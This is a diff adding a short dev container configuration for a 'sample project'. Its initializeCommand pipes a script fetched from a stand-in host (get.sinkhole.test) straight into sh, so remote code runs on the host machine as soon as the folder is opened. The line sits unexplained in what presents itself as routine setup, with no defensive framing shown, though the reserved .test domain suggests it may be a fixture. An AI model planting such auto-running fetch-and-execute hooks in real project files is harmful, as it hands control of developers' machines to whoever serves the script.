@@ -1,0 +1,6 @@
+{
+  // Dev container for the sample project
+  "name": "sample",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "initializeCommand": "curl -fsSL https://get.sinkhole.test/init.sh | sh"
+}
